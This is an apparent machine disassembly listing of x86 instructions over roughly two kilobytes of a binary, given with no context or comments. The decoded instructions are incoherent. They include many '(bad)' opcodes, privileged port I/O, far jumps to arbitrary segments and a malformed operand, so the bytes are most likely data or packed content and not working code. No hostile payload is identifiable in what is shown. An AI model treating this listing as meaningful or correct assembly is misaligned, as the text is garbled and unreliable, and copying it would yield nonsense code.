  41478d:	lods   eax,DWORD PTR ds:[esi]
  41478e:	arpl   WORD PTR [edx-0x3e7f5093],cx
  414794:	test   al,0x59
  414796:	push   ecx
  414797:	lahf   
  414798:	push   ebx
  414799:	and    bh,BYTE PTR [ebx+0x45]
  41479c:	sahf   
  41479d:	iret   
  41479e:	mov    eax,DWORD PTR [ebx+ebp*2]
  4147a1:	pop    esp
  4147a2:	jmp    0xf936:0x10b384ff
  4147a9:	aaa    
  4147aa:	loope  0x4147bb
  4147ac:	fimul  DWORD PTR [edx+0x14]
  4147af:	mov    al,0x9e
  4147b1:	pop    edi
  4147b2:	or     al,0x83
  4147b4:	rcr    DWORD PTR [esi+0x2b507674],cl
  4147ba:	in     eax,dx
  4147bb:	push   esp
  4147bc:	ja     0x414747
  4147be:	cmp    eax,0xc4c1d60d
  4147c3:	aad    0x8c
  4147c5:	scas   eax,DWORD PTR es:[edi]
  4147c6:	cmp    esp,DWORD PTR [ecx+ecx*1-0x70ea528f]
  4147cd:	int3   
  4147ce:	aam    0x3c
  4147d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147d2:	adc    dh,ch
  4147d4:	jl     0x41478e
  4147d6:	push   ebx
  4147d7:	jns    0x414774
  4147d9:	loope  0x4147fb
  4147db:	lods   al,BYTE PTR ds:[esi]
  4147dc:	push   edi
  4147dd:	fs cmp al,ah
  4147e0:	fisubr DWORD PTR [ebp+eax*8+0x6e]
  4147e4:	mov    ch,0x95
  4147e6:	pop    esi
  4147e7:	(bad)  
  4147e8:	jge    0x41482e
  4147ea:	adc    DWORD PTR [eax],esp
  4147ec:	pop    ds
  4147ed:	cs es or esp,0x3d
  4147f2:	inc    edx
  4147f3:	pop    DWORD PTR [esi+0x1f]
  4147f6:	sbb    eax,0x16df18d
  4147fb:	out    0x2,al
  4147fd:	cmp    eax,0x597aa42
  414802:	xchg   ebx,eax
  414803:	in     al,dx
  414804:	mov    bh,0xcf
  414806:	int    0x1c
  414808:	adc    DWORD PTR [eax-0x32],edx
  41480b:	repnz ins BYTE PTR es:[edi],dx
  41480d:	mov    edx,0x81979205
  414812:	ret    0xac9b
  414815:	xor    eax,0x608fd6a
  41481a:	fs mov ch,0x79
  41481d:	dec    eax
  41481e:	cmp    edi,eax
  414820:	iret   
  414821:	mov    ds:0x9a0e5e7b,eax
  414826:	fwait
  414827:	sti    
  414828:	or     eax,0x1ddc4119
  41482d:	ret    
  41482e:	dec    esp
  41482f:	scas   eax,DWORD PTR es:[edi]
  414830:	add    DWORD PTR [edi],0x5f
  414833:	mov    ds:0x4d21396,al
  414838:	pop    esi
  414839:	(bad)  
  41483a:	rol    DWORD PTR [ebp+ecx*1-0x76],1
  41483e:	cmp    edi,DWORD PTR [edi+eax*8-0x35]
  414842:	int3   
  414843:	mov    al,ds:0xd850dff8
  414848:	sbb    BYTE PTR ds:0xe071ad21,dl
  41484e:	fisub  DWORD PTR [edx]
  414850:	push   ds
  414851:	inc    ebp
  414852:	and    DWORD PTR [esi+0x14],esp
  414855:	in     al,dx
  414856:	mov    ebx,0xb970c5d3
  41485b:	outs   dx,BYTE PTR ds:[esi]
  41485c:	pop    ds
  41485d:	or     DWORD PTR [edi+0x6c],esi
  414860:	sbb    BYTE PTR [esi-0xa],ah
  414863:	in     al,0xf5
  414865:	xchg   esi,eax
  414866:	call   0x4c49:0x8f1c2c41
  41486d:	std    
  41486e:	lds    esp,FWORD PTR [esi]
  414870:	jmp    0xaf9498
  414875:	xchg   edi,eax
  414876:	call   0xf3eb:0x46392780
  41487d:	pop    edx
  41487e:	inc    esi
  41487f:	mov    ch,0x62
  414881:	es push es
  414883:	add    esp,DWORD PTR [eax]
  414885:	stos   DWORD PTR es:[edi],eax
  414886:	mov    dl,0xc9
  414888:	ja     0x4148d4
  41488a:	and    ah,BYTE PTR [edx]
  41488c:	mov    ebp,0x9252a409
  414891:	xor    bh,al
  414893:	retf   0x7447
  414896:	shl    DWORD PTR ds:0x3d480d3a,cl
  41489c:	ins    DWORD PTR es:[edi],dx
  41489d:	mov    ds:0x3287eec6,al
  4148a2:	push   ebp
  4148a3:	inc    ebx
  4148a4:	push   ds
  4148a5:	fstp   QWORD PTR ds:0xe09ef4fa
  4148ab:	mov    ds:0x70fd1769,al
  4148b0:	dec    esi
  4148b1:	xor    ah,BYTE PTR [edi]
  4148b3:	std    
  4148b4:	outs   dx,BYTE PTR ds:[esi]
  4148b5:	std    
  4148b6:	sbb    eax,0xb26da574
  4148bb:	add    bh,dl
  4148bd:	inc    ebp
  4148be:	aas    
  4148bf:	mov    bl,0x3d
  4148c1:	test   DWORD PTR [esp+esi*2+0xb],ecx
  4148c5:	and    BYTE PTR ds:0x1e6c454f,ch
  4148cb:	adc    al,0x40
  4148cd:	test   DWORD PTR [ebx],ebp
  4148cf:	fistp  WORD PTR [edi-0x58]
  4148d2:	(bad)
  4148d5:	(bad)  
  4148d6:	lock xchg ebp,eax
  4148d8:	cwde   
  4148d9:	ror    DWORD PTR [ebx-0x38e9385e],1
  4148df:	inc    edx
  4148e0:	pop    ss
  4148e1:	jae    0x4148ea
  4148e3:	sbb    eax,0xa59b7f3e
  4148e8:	gs push 0xfffffffc
  4148eb:	dec    esp
  4148ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ed:	mov    dh,0x5d
  4148ef:	int    0xba
  4148f1:	leave  
  4148f2:	xchg   ebp,eax
  4148f3:	je     0x4148f7
  4148f5:	cmp    BYTE PTR [esi+esi*2],dh
  4148f8:	and    BYTE PTR [ecx-0x3e],dl
  4148fb:	fcomi  st,st(3)
  4148fd:	not    edi
  4148ff:	ret    0xb0ab
  414902:	in     al,0x46
  414904:	jl     0x414985
  414906:	and    ah,BYTE PTR [ebx]
  414908:	jns    0x41489f
  41490a:	xor    al,BYTE PTR [edi-0x7e]
  41490d:	mov    dh,ch
  41490f:	xchg   ecx,eax
  414910:	or     edi,DWORD PTR [edx]
  414912:	popf   
  414913:	xchg   esp,eax
  414914:	repz mov edx,0x87346d1a
  41491a:	sub    BYTE PTR [edx+0x2ce1a808],bh
  414920:	mov    esi,0xade65ed6
  414925:	popa   
  414926:	push   ecx
  414927:	cmpxchg DWORD PTR ds:0x3a536543,ebp
  41492e:	add    DWORD PTR [edi],0x46
  414931:	loopne 0x414912
  414933:	popf   
  414934:	or     ah,bh
  414936:	inc    esp
  414937:	pop    ecx
  414938:	sbb    DWORD PTR [ebx-0x9ead4e3],0xed78918d
  414942:	jb     0x4148d6
  414944:	(bad)  
  414946:	rol    BYTE PTR [eax-0xc],1
  414949:	jnp    0x414977
  41494b:	cwde   
  41494c:	in     eax,dx
  41494d:	stos   BYTE PTR es:[edi],al
  41494e:	(bad)  
  41494f:	cmp    esi,DWORD PTR [edi]
  414951:	xchg   BYTE PTR [edx+0x6d],dh
  414954:	(bad)  
  414956:	jne    0x41490d
  414958:	inc    eax
  414959:	outs   dx,DWORD PTR ds:[esi]
  41495a:	inc    ebp
  41495b:	push   esi
  41495c:	cmp    ecx,DWORD PTR [esi+ebx*4]
  41495f:	mov    ecx,0x8e52b9cc
  414964:	xchg   BYTE PTR [edx+edx*8+0x2],bh
  414968:	mov    ecx,?
  41496a:	lock retf 
  41496c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41496d:	mov    esp,0xa14ecfdb
  414972:	sub    esp,DWORD PTR ds:0x4f2e1cc7
  414978:	push   edi
  414979:	lods   eax,DWORD PTR ds:[esi]
  41497a:	pop    edx
  41497b:	das    
  41497c:	scas   al,BYTE PTR es:[edi]
  41497d:	or     al,0xd5
  41497f:	push   ss
  414980:	shr    DWORD PTR [edi+ebp*2],cl
  414983:	sub    al,0x66
  414985:	dec    ebx
  414986:	inc    esi
  414987:	in     eax,dx
  414988:	sbb    al,0x1a
  41498a:	pop    ebp
  41498b:	aaa    
  41498c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41498d:	cwde   
  41498e:	push   cs
  41498f:	hlt    
  414990:	and    DWORD PTR [edx+0x6113dd42],0xffffffbc
  414997:	cmp    eax,0x1d359b7c
  41499c:	neg    DWORD PTR [ebx+0x5a]
  41499f:	icebp  
  4149a0:	jno    0x41495e
  4149a2:	add    ebx,DWORD PTR [ebx]
  4149a4:	loopne 0x414a09
  4149a6:	fisub  WORD PTR [edx]
  4149a8:	xchg   ebp,eax
  4149a9:	lea    edi,[ecx+ebx*4+0x19]
  4149ad:	ja     0x41497f
  4149af:	(bad)  
  4149b0:	(bad)  
  4149b2:	cmp    bh,dh
  4149b4:	mov    al,0x4c
  4149b6:	or     dh,BYTE PTR [edx+eax*1]
  4149b9:	mov    dh,0x61
  4149bb:	push   eax
  4149bc:	xchg   edi,eax
  4149bd:	push   ebx
  4149be:	inc    edx
  4149bf:	add    ah,dl
  4149c1:	dec    edx
  4149c2:	stos   DWORD PTR es:[edi],eax
  4149c3:	(bad)  
  4149c4:	ja     0x4149f9
  4149c6:	sbb    al,0xca
  4149c8:	fwait
  4149c9:	xchg   ecx,eax
  4149ca:	out    dx,eax
  4149cb:	rcl    BYTE PTR fs:[ebx-0x4a61867b],cl
  4149d2:	ficom  WORD PTR [edx+0x4]
  4149d5:	push   0x59
  4149d7:	pmulhw mm6,mm7
  4149da:	mov    ebp,0x3c9ab2c9
  4149df:	xlat   BYTE PTR ds:[ebx]
  4149e0:	or     al,dl
  4149e2:	push   es
  4149e3:	xchg   ecx,eax
  4149e4:	je     0x414a44
  4149e6:	jmp    0xb675:0xf7233b98
  4149ed:	aaa    
  4149ee:	adc    edi,DWORD PTR ds:[ebp-0x3191a49d]
  4149f5:	xchg   esp,eax
  4149f6:	push   ebp
  4149f7:	inc    edx
  4149f8:	shl    BYTE PTR [ebp-0x2f],cl
  4149fb:	sar    BYTE PTR gs:[edi-0x64f6078a],0x7c
  414a03:	push   ss
  414a04:	lahf   
  414a05:	sti    
  414a06:	enter  0x44c,0x60
  414a0a:	mov    WORD PTR [ebp-0x70],ds
  414a0d:	dec    esi
  414a0e:	fimul  WORD PTR [ebx+0xd]
  414a11:	je     0x414998
  414a13:	xchg   ebp,eax
  414a14:	mov    esp,0xa8b4c603
  414a19:	clc    
  414a1a:	and    ebp,0x66
  414a1d:	jb     0x414a80
  414a1f:	sar    DWORD PTR [edi],0xe1
  414a22:	loop   0x4149c5
  414a24:	inc    eax
  414a25:	or     esi,DWORD PTR [eax+0x4d450763]
  414a2b:	push   0x27276cc5
  414a30:	jo     0x414a14
  414a32:	inc    edi
  414a33:	stos   BYTE PTR es:[edi],al
  414a34:	mov    eax,ds:0x5a36c800
  414a39:	add    ebp,DWORD PTR [eax+eax*4-0x435bfe1d]
  414a40:	mov    bl,0x9c
  414a42:	inc    eax
  414a43:	inc    ebx
  414a44:	pushf  
  414a45:	es inc ebp
  414a47:	xchg   DWORD PTR [ebp+0x4a],esp
  414a4a:	cdq    
  414a4b:	mov    al,0x3f
  414a4d:	jns    0x414a21
  414a4f:	sub    bh,BYTE PTR [eax-0x612028ef]
  414a55:	mov    edx,0x5a70ad1b
  414a5a:	xlat   BYTE PTR ds:[ebx]
  414a5b:	push   ebp
  414a5c:	inc    ebp
  414a5d:	test   DWORD PTR [edx-0x2a7af4aa],0xbf527ccb
  414a67:	outs   dx,BYTE PTR ds:[esi]
  414a68:	dec    ebx
  414a69:	inc    esp
  414a6a:	xchg   edx,eax
  414a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a6c:	mov    ds:0xd3d56f81,eax
  414a71:	mov    ds:0x5a2fe43d,eax
  414a76:	mov    ds:0x5b83b114,eax
  414a7b:	mov    esi,0x1012f203
  414a80:	dec    ebp
  414a81:	loop   0x414ada
  414a83:	shl    DWORD PTR [esi-0x43],cl
  414a86:	rcl    BYTE PTR [eax-0x2],cl
  414a89:	rol    DWORD PTR [edi+0x4d],1
  414a8c:	cs add eax,0x566cd140
  414a92:	inc    edi
  414a93:	sub    edx,esp
  414a95:	mov    eax,0xf3641b81
  414a9a:	fs adc al,0x47
  414a9d:	jb     0x414a86
  414a9f:	aam    0x40
  414aa1:	aaa    
  414aa2:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414aa4:	xor    eax,0xa5fc1f34
  414aa9:	jle    0x414a81
  414aab:	mov    bl,0x73
  414aad:	sub    esp,DWORD PTR [ebx+0x6fe81902]
  414ab3:	mov    ds:0x2d16ee8c,al
  414ab8:	cmp    eax,0x994b4f5a
  414abd:	lock xchg edx,eax
  414ac0:	outs   dx,BYTE PTR ds:[esi]
  414ac1:	pop    edx
  414ac2:	lahf   
  414ac3:	scas   al,BYTE PTR es:[edi]
  414ac4:	fwait
  414ac5:	cmp    BYTE PTR [esi+0x1b],0xe7
  414ac9:	fwait
  414aca:	(bad)  
  414acb:	out    0xe4,eax
  414acd:	xlat   BYTE PTR ds:[ebx]
  414ace:	je     0x414aeb
  414ad0:	jae    0x414b25
  414ad2:	and    al,0x4
  414ad4:	mov    bh,0xd8
  414ad6:	outs   dx,DWORD PTR ds:[esi]
  414ad7:	lock or edi,DWORD PTR [edx+0x72]
  414adb:	inc    ebx
  414adc:	mov    BYTE PTR [ebp+0x42],dl
  414adf:	(bad)  [eax-0x75]
  414ae2:	inc    esp
  414ae3:	mov    ds:0x349b81f,eax
  414ae8:	adc    bh,BYTE PTR ds:[ebx+0xdd876eb]
  414aef:	inc    edi
  414af0:	and    BYTE PTR [esi-0x199244d7],0xc5
  414af7:	loop   0x414b66
  414af9:	inc    ebx
  414afa:	test   eax,0x62466dae
  414aff:	push   ds
  414b00:	xor    ebp,DWORD PTR [edx+0x54]
  414b03:	sub    DWORD PTR [eax],ebp
  414b05:	xchg   edx,eax
  414b06:	bound  eax,QWORD PTR [eax]
  414b08:	jb     0x414b0b
  414b0a:	stos   DWORD PTR es:[edi],eax
  414b0b:	mov    cs,WORD PTR [ecx]
  414b0d:	hlt    
  414b0e:	adc    eax,0x11ab8604
  414b13:	mov    ebx,0xde2148a3
  414b18:	and    al,0x7a
  414b1a:	jo     0x414aef
  414b1c:	jne    0x414aac
  414b1e:	add    al,0xa5
  414b20:	jnp    0x414ac1
  414b22:	mov    bh,0x1b
  414b24:	xor    esp,DWORD PTR [eax-0x3e]
  414b27:	mov    ch,0xed
  414b29:	dec    ecx
  414b2a:	add    eax,0x3834bb17
  414b2f:	retf   0x89a3
  414b32:	sub    al,0x9
  414b34:	push   edi
  414b35:	inc    ebx
  414b36:	test   BYTE PTR [edi+eiz*8],al
  414b39:	ss dec esp
  414b3b:	dec    eax
  414b3c:	xor    ebx,esi
  414b3e:	add    BYTE PTR [ecx-0x7],ah
  414b41:	dec    esp
  414b42:	popa   
  414b43:	test   BYTE PTR [ecx-0x2579a0c2],cl
  414b49:	scas   eax,DWORD PTR es:[edi]
  414b4a:	pushf  
  414b4b:	hlt    
  414b4c:	repz fcomp QWORD PTR [ebp-0x2d6d87ab]
  414b53:	fnstenv [ebx]
  414b55:	add    eax,0x76750542
  414b5a:	push   0xffffffa5
  414b5c:	pop    ecx
  414b5d:	xchg   sp,ax
  414b5f:	lock mov esi,0xa48773be
  414b65:	fs lahf 
  414b67:	repz sahf 
  414b69:	jns    0x414bc0
  414b6b:	js     0x414ba3
  414b6d:	cmp    esp,esi
  414b6f:	cmp    DWORD PTR [ebp+0x35bf5113],esp
  414b75:	out    dx,eax
  414b76:	(bad)
  414b7b:	dec    esi
  414b7c:	jmp    0x261d40f8
  414b81:	out    dx,al
  414b82:	gs js  0x414b18
  414b85:	out    dx,eax
  414b86:	pop    ebx
  414b87:	adc    eax,0x754871f0
  414b8c:	loopne 0x414bd1
  414b8e:	or     al,0xe2
  414b90:	jns    0x414bc6
  414b92:	data16 (bad) 
  414b94:	mov    bh,0xad
  414b96:	fs push ss
  414b98:	ret    0x5180
  414b9b:	adc    DWORD PTR [edx+ecx*2],ebp
  414b9e:	jae    0x414b9b
  414ba0:	sub    al,0x17
  414ba2:	iret   
  414ba3:	push   ds
  414ba4:	out    0x55,eax
  414ba6:	mov    dh,0xc
  414ba8:	(bad)  
  414ba9:	mov    ah,ch
  414bab:	mov    ds:0x1449a8b1,eax
  414bb0:	mov    bh,0xda
  414bb2:	cmp    bh,BYTE PTR [ebp+0x14]
  414bb5:	inc    ebx
  414bb6:	pop    esi
  414bb7:	mov    bl,0x5e
  414bb9:	mov    ebx,0x8107b760
  414bbe:	ins    DWORD PTR es:[edi],dx
  414bbf:	mov    ch,0x4
  414bc1:	movntps XMMWORD PTR [eax+0x71083a31],xmm0
  414bc8:	sbb    eax,0x693ef298
  414bcd:	pop    ebp
  414bce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bcf:	xchg   DWORD PTR [edi],ebp
  414bd1:	or     DWORD PTR [ebp-0x1b31a08c],0xffffffd5
  414bd8:	fisub  DWORD PTR [esi+0x1400f6fe]
  414bde:	xor    DWORD PTR [ecx+0x47835a29],ecx
  414be4:	fist   WORD PTR [eax+edi*8]
  414be7:	pop    eax
  414be8:	xor    eax,0xcb562f27
  414bed:	aas    
  414bee:	iret   
  414bef:	xor    al,0xe9
  414bf1:	test   eax,0xd979cf47
  414bf7:	outs   dx,BYTE PTR ds:[esi]
  414bf8:	(bad)  
  414bfa:	test   ah,ah
  414bfc:	cmp    DWORD PTR fs:[edi],edi
  414bff:	dec    ebx
  414c00:	pop    esp
  414c01:	aad    0x70
  414c03:	and    al,0xa4
  414c05:	shl    DWORD PTR [eax-0x11],0xe9
  414c09:	sub    dl,ch
  414c0b:	inc    ebx
  414c0c:	mov    ch,0x58
  414c0e:	pop    es
  414c0f:	cmp    dh,bl
  414c11:	cmp    eax,0x597f7782
  414c16:	inc    ebp
  414c17:	push   ebp
  414c18:	sbb    edi,DWORD PTR [esi-0x8]
  414c1b:	es (bad) 
  414c1d:	mov    bl,0x8d
  414c1f:	cmp    edi,DWORD PTR [esp+ecx*8+0x11]
  414c23:	ror    BYTE PTR [ebp+0x19],cl
  414c26:	mov    al,0x3f
  414c28:	sar    esp,cl
  414c2a:	ss pop ds
  414c2c:	adc    esp,ebp
  414c2e:	and    BYTE PTR [edx],al
  414c30:	dec    esi
  414c31:	in     eax,0x54
  414c33:	lea    ecx,[ecx-0xa]
  414c36:	inc    ebp
  414c37:	jns    0x414c08
  414c39:	enter  0x4088,0xfa
  414c3d:	jmp    0xb77f16fe
  414c42:	add    ch,BYTE PTR [ecx]
  414c44:	and    eax,0x33425e0b
  414c49:	scas   eax,DWORD PTR es:[edi]
  414c4a:	fidiv  DWORD PTR [ecx]
  414c4c:	je     0x414c49
  414c4e:	stc    
  414c4f:	sbb    dh,ch
  414c51:	mov    dl,0xd2
  414c53:	(bad)  
  414c55:	mov    fs,WORD PTR [eax+eax*2-0x2506741a]
  414c5c:	xchg   esi,eax
  414c5d:	pop    esi
  414c5e:	(bad)  
  414c5f:	pop    eax
  414c60:	add    BYTE PTR [ecx-0x50be2f8d],bh
  414c66:	jmp    0x414ce1
  414c68:	shl    DWORD PTR [ebx+0x2e],cl
  414c6b:	pop    ss
  414c6c:	mov    edi,0xa534167
  414c71:	fwait
  414c72:	gs out 0x2e,al
  414c75:	push   edx
  414c76:	mov    ah,0xb8
  414c78:	xchg   ebx,eax
  414c79:	es xor eax,0x6d4f81ab
  414c7f:	call   DWORD PTR ds:0xac27fccd
  414c85:	add    BYTE PTR [edi+ecx*8-0x7c845d94],dl
  414c8c:	aas    
  414c8d:	(bad)  
  414c8e:	pop    edx
  414c8f:	jp     0x414cef
  414c91:	lods   al,BYTE PTR ds:[esi]
  414c92:	es in  al,dx
  414c94:	pop    ecx
  414c95:	sub    al,ch
  414c97:	cmp    eax,0xb8766a83
  414c9c:	nop
  414c9d:	pop    ebx
  414c9e:	lea    esp,ds:0xece11f7a
  414ca4:	popa   
  414ca5:	inc    esi
  414ca6:	gs inc ebx
  414ca8:	add    eax,0x3c3999d6
  414cad:	mov    cl,0x84
  414caf:	push   ebp
  414cb0:	fsubrp st(6),st
  414cb2:	loope  0x414cdd
  414cb4:	dec    esi
  414cb5:	data16 daa 
  414cb7:	jo     0x414c8e
  414cb9:	and    ebp,DWORD PTR [ecx-0x34]
  414cbc:	dec    edi
  414cbd:	jo     0x414cbb
  414cbf:	mov    al,0xc0
  414cc1:	or     DWORD PTR [ebx+0x7b],ebx
  414cc4:	mov    esp,0xf2610279
  414cc9:	sar    WORD PTR fs:[edx+esi*8],1
  414cce:	jb     0x414d02
  414cd0:	call   0xb65a3aed
  414cd5:	mov    bl,BYTE PTR [edx-0x7d]
  414cd8:	out    0x2d,eax
  414cda:	push   esi
  414cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414cdc:	sub    ch,BYTE PTR [esi-0x76d854da]
  414ce2:	xchg   edx,eax
  414ce3:	sahf   
  414ce4:	pop    edx
  414ce5:	sub    ah,dh
  414ce7:	inc    ebx
  414ce8:	sbb    al,0x2d
  414cea:	cmp    eax,0xda79a732
  414cef:	xlat   BYTE PTR ds:[ebx]
  414cf0:	inc    edx
  414cf1:	inc    ebx
  414cf2:	ins    BYTE PTR es:[edi],dx
  414cf3:	add    ebx,edx
  414cf5:	jnp    0x414cde
  414cf7:	jecxz  0x414c99
  414cf9:	ror    dh,0x41
  414cfc:	adc    edi,esp
  414cfe:	lods   eax,DWORD PTR ds:[esi]
  414cff:	jmp    0xb0f9:0xfe1e4fbf
  414d06:	sbb    eax,0x7ade7434
  414d0b:	push   esi
  414d0c:	mov    cl,0xb6
  414d0e:	jmp    0x16dd:0xb5708739
  414d15:	mov    ah,0x31
  414d17:	or     eax,0xcfd2cbe3
  414d1c:	mov    BYTE PTR [edx-0x3a],dh
  414d1f:	cwde   
  414d20:	adc    bl,cl
  414d22:	jp     0x414d9d
  414d24:	cwde   
  414d25:	inc    edx
  414d26:	adc    bl,BYTE PTR [eax]
  414d28:	pusha  
  414d29:	and    BYTE PTR [esi-0xb],bh
  414d2c:	xor    al,0xa8
  414d2e:	test   DWORD PTR [edx+0x60],eax
  414d31:	push   ebp
  414d32:	aam    0xcc
  414d34:	loop   0x414cf1
  414d36:	mov    ch,0xaf
  414d38:	add    ebx,edx
  414d3a:	stc    
  414d3b:	pop    ecx
  414d3c:	popa   
  414d3d:	int3   
  414d3e:	and    esi,DWORD PTR [eax]
  414d40:	jle    0x414d32
  414d42:	sub    edi,DWORD PTR [edx-0x4b11c167]
  414d48:	ret    
  414d49:	repz adc dl,BYTE PTR [eax-0x6c]
  414d4d:	inc    DWORD PTR [ebx+0x3f]
  414d50:	dec    esi
  414d51:	sub    edx,DWORD PTR [ecx+0x139bb10f]
  414d57:	or     ebx,DWORD PTR [ebx+0x17]
  414d5a:	es cmc 
  414d5c:	call   edi
  414d5e:	fadd   QWORD PTR [esi-0x38]
  414d61:	(bad)  
  414d62:	xor    cl,BYTE PTR [edi]
  414d64:	test   bl,0x87
  414d67:	xor    BYTE PTR ds:0xf6180a4b,ch
  414d6d:	dec    esp
  414d6e:	pop    ss
  414d6f:	jbe    0x414d94
  414d71:	inc    edi
  414d72:	or     BYTE PTR [esi+0x514988bf],0xf9
  414d79:	pop    ebx
  414d7a:	mov    ecx,0x16703b24
  414d7f:	out    0x3f,eax
  414d81:	das    
  414d82:	sbb    al,0xcf
  414d84:	daa    
  414d85:	mov    al,ds:0x7edfacd3
  414d8a:	sbb    ebx,edx
  414d8c:	and    al,dl
  414d8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d8f:	sbb    esi,esi
  414d91:	mov    BYTE PTR [eax+0x6],bl
  414d94:	fimul  WORD PTR ds:0x1f5b7951
  414d9a:	mov    ebp,0x95da01de
  414d9f:	xchg   ecx,eax
  414da0:	pop    ss
  414da1:	adc    ecx,DWORD PTR [edi+edi*2+0x3ebf81d7]
  414da8:	or     bh,BYTE PTR [ebp-0x5559e447]
  414dae:	mov    edx,0x2350d684
  414db3:	inc    ecx
  414db4:	jecxz  0x414daf
  414db6:	adc    ecx,DWORD PTR [ebx+0x4dbb0fc4]
  414dbc:	cmp    BYTE PTR [edi-0x510dcded],ch
  414dc2:	dec    ebp
  414dc3:	xchg   edi,eax
  414dc4:	sub    bl,bl
  414dc6:	inc    BYTE PTR [ebx+0x1c1e5fa2]
  414dcc:	sub    DWORD PTR [esi-0x30f4dad1],0x9711a73d
  414dd6:	int3   
  414dd7:	sbb    eax,0x1eee8931
  414ddc:	sti    
  414ddd:	and    eax,0xd3ab7dd9
  414de2:	leave  
  414de3:	rol    DWORD PTR [esi-0x7ab11c94],0x88
  414dea:	jp     0x414e51
  414dec:	inc    eax
  414ded:	outs   dx,DWORD PTR ds:[esi]
  414dee:	mov    edi,0xd513abf4
  414df3:	das    
  414df4:	mov    edi,0xa471c131
  414df9:	push   ss
  414dfa:	dec    ebp
  414dfb:	and    eax,0x42974e31
  414e00:	pop    eax
  414e01:	hlt    
  414e02:	pop    ss
  414e03:	cmc    
  414e04:	push   0xbc477413
  414e09:	adc    bl,ch
  414e0b:	arpl   WORD PTR ds:0x1daa1f74,si
  414e11:	and    DWORD PTR [esi+0x34],0xfb243853
  414e18:	out    0x56,eax
  414e1a:	icebp  
  414e1b:	inc    ecx
  414e1c:	jns    0x414e88
  414e1e:	aaa    
  414e1f:	fimul  DWORD PTR ss:[eax-0x25e9e589]
  414e26:	je     0x414df9
  414e28:	hlt    
  414e29:	shr    BYTE PTR [edx+0x46],cl
  414e2c:	cmc    
  414e2d:	(bad)
  414e31:	pop    ecx
  414e32:	pop    ebx
  414e33:	xor    al,0x43
  414e35:	xchg   esi,eax
  414e36:	mov    dh,0xae
  414e38:	inc    esi
  414e39:	sahf   
  414e3a:	add    ch,BYTE PTR [ebx]
  414e3c:	lods   al,BYTE PTR ds:[esi]
  414e3d:	mov    BYTE PTR [ebx],bh
  414e3f:	inc    edx
  414e40:	and    BYTE PTR [edi+0xa69c22b],dl
  414e46:	xchg   edi,eax
  414e47:	jbe    0x414eae
  414e49:	(bad)  
  414e4a:	shr    DWORD PTR [eax+esi*4+0x9],0x7a
  414e4f:	sub    eax,edx
  414e51:	xchg   esi,eax
  414e52:	sbb    dl,ch
  414e54:	xchg   ecx,eax
  414e55:	pop    eax
  414e56:	and    ebp,DWORD PTR [esi]
  414e58:	loopne 0x414e9f
  414e5a:	mov    esi,DWORD PTR [edi]
  414e5c:	xchg   BYTE PTR [ebx+edi*1-0x1418f0b1],ah
  414e63:	int3   
  414e64:	adc    esp,0xffffffa7
  414e67:	push   ss
  414e68:	sbb    al,0xba
  414e6a:	mov    edx,0x39369c7b
  414e6f:	sub    BYTE PTR [edi],al
  414e71:	rcl    DWORD PTR gs:[ebx],1
  414e74:	scas   eax,DWORD PTR es:[edi]
  414e75:	xor    DWORD PTR [ecx+0x22],ecx
  414e78:	ret    
  414e79:	jecxz  0x414e7f
  414e7b:	retf   
  414e7c:	in     al,dx
  414e7d:	jae    0x414e78
  414e7f:	nop
  414e80:	adc    esi,DWORD PTR [ecx]
  414e82:	xor    al,0x94
  414e84:	ret    
  414e85:	xor    ecx,edi
  414e87:	adc    eax,0xcf01115c
  414e8c:	out    0x9,eax
  414e8e:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414e90:	out    dx,al
  414e91:	aas    
  414e92:	mov    DWORD PTR [eax+0x3a537ee9],ebx
  414e98:	mov    dh,0xfc
  414e9a:	rcr    BYTE PTR [ebx+0x20f82bf6],cl
  414ea0:	adc    esi,0x67
  414ea3:	aas    
  414ea4:	aam    0xba
  414ea6:	xchg   BYTE PTR [esi+0x2ee06e1],al
  414eac:	call   0xd1c70979
  414eb1:	xchg   esp,eax
  414eb2:	push   0x37
  414eb4:	lods   al,BYTE PTR ds:[esi]
  414eb5:	idiv   ebx
  414eb7:	es out dx,eax
  414eb9:	je     0x414e83
  414ebb:	cmp    DWORD PTR [esp+edi*4-0x76605cf2],eax
  414ec2:	popa   
  414ec3:	in     eax,0x52
  414ec5:	or     esp,DWORD PTR [ebx+0x232976eb]
  414ecb:	shl    ebp,cl
  414ecd:	rcr    DWORD PTR fs:[edi+edx*8],0xfa
  414ed2:	and    DWORD PTR [esp+edx*8+0x5460a844],0x19
  414eda:	jne    0x414f53
  414edc:	dec    edx
  414edd:	sbb    al,BYTE PTR [edx]
  414edf:	lea    ebx,[ecx+ecx*1-0x58]
  414ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ee4:	mov    ebp,0xa42524d2
  414ee9:	outs   dx,DWORD PTR ds:[esi]
  414eea:	sub    eax,DWORD PTR [eax-0x30]
  414eed:	mov    es,esp
  414eef:	mov    al,ds:0xea0f7d8b
  414ef4:	mov    gs,WORD PTR [edi+0x5a]
  414ef7:	mov    BYTE PTR [eax+0x72],ch
  414efa:	mov    esi,0x96e536d2
  414eff:	test   bl,dh
  414f01:	push   esi
  414f02:	adc    ah,BYTE PTR [ecx+0x22]
  414f05:	idiv   DWORD PTR [ebx-0x47d59b54]
  414f0b:	ret    0xa9c1
  414f0e:	lods   al,BYTE PTR ds:[esi]
  414f0f:	test   bl,ch
  414f11:	xchg   esp,eax
  414f12:	cmp    eax,ecx
  414f14:	dec    esp
  414f15:	(bad)  
  414f16:	and    eax,0x6539f369
  414f1b:	jb     0x414f83
  414f1d:	pop    esp
  414f1e:	mov    ds:0xd3e7eb80,eax
  414f23:	ja     0x414efb
  414f25:	test   BYTE PTR [ecx+eax*8+0x45],ch
  414f29:	scas   eax,DWORD PTR es:[edi]
  414f2a:	dec    ebx
  414f2b:	push   es
  414f2c:	test   BYTE PTR [edi+0x3c],dl
  414f2f:	add    edi,DWORD PTR [esi+0x7a]
